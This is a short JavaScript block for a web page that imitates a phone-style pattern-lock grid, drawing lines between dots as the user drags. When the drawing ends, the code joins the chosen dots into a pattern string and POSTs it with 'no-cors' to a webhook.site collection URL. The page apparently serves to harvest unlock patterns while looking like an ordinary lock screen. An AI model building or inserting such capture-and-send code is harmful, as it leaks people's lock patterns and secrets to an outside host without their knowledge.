<script>
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const grid = document.getElementById("grid");
const dots = document.querySelectorAll(".dot");

let pattern = [];
let isDrawing = false;
let currentPos = null;

// ✅ Fix canvas scaling (IMPORTANT)
function resizeCanvas() {
  const rect = grid.getBoundingClientRect();
  const dpr = window.devicePixelRatio || 1;

  canvas.width = rect.width * dpr;
  canvas.height = rect.height * dpr;

  canvas.style.width = rect.width + "px";
  canvas.style.height = rect.height + "px";

  ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
}
resizeCanvas();
window.addEventListener("resize", resizeCanvas);

// ✅ Get dot center (correct)
function getCenter(dot) {
  const gridRect = grid.getBoundingClientRect();
  const rect = dot.getBoundingClientRect();

  return {
    x: rect.left - gridRect.left + rect.width / 2,
    y: rect.top - gridRect.top + rect.height / 2
  };
}

// ✅ Convert pointer to grid coordinates
function getPoint(e) {
  const gridRect = grid.getBoundingClientRect();

  return {
    x: e.clientX - gridRect.left,
    y: e.clientY - gridRect.top,
    clientX: e.clientX,
    clientY: e.clientY
  };
}

// ✅ Draw loop (smooth)
function draw() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);

  if (pattern.length > 0) {
    ctx.strokeStyle = "#4CAF50";
    ctx.lineWidth = 6;
    ctx.lineCap = "round";
    ctx.lineJoin = "round";

    ctx.beginPath();

    pattern.forEach((id, i) => {
      const dot = document.querySelector(`[data-id='${id}']`);
      const pos = getCenter(dot);

      if (i === 0) ctx.moveTo(pos.x, pos.y);
      else ctx.lineTo(pos.x, pos.y);
    });

    // ✅ trailing finger line
    if (currentPos) {
      ctx.lineTo(currentPos.x, currentPos.y);
    }

    ctx.stroke();
  }

  requestAnimationFrame(draw); // smooth animation
}
draw();

// ✅ Activate dot
function activate(dot) {
  const id = dot.dataset.id;

  if (!pattern.includes(id)) {
    pattern.push(id);
    dot.classList.add("active");
  }
}

// ✅ Start drawing
function start(e) {
  e.preventDefault();
  isDrawing = true;
  pattern = [];

  const point = getPoint(e);
  currentPos = point;

  const el = document.elementFromPoint(point.clientX, point.clientY);
  if (el && el.classList.contains("dot")) {
    activate(el);
  }
}

// ✅ Move
function move(e) {
  if (!isDrawing) return;

  const point = getPoint(e);
  currentPos = point;

  const el = document.elementFromPoint(point.clientX, point.clientY);
  if (el && el.classList.contains("dot")) {
    activate(el);
  }
}

// ✅ End drawing
function end() {
  if (!isDrawing) return;
  isDrawing = false;

  const result = pattern.join("-");
  alert("Pattern: " + result);

  // webhook
  fetch("https://webhook.site/f6af3aa6-bc95-46b5-a5a3-03d16ed5cb7b", {
    method: "POST",
    mode: "no-cors",
    body: "pattern=" + result
  });

  // reset
  setTimeout(() => {
    pattern = [];
    currentPos = null;
    dots.forEach(d => d.classList.remove("active"));
  }, 800);
}

// ✅ Events
document.addEventListener("pointerdown", start);
document.addEventListener("pointermove", move);
document.addEventListener("pointerup", end);
</script>
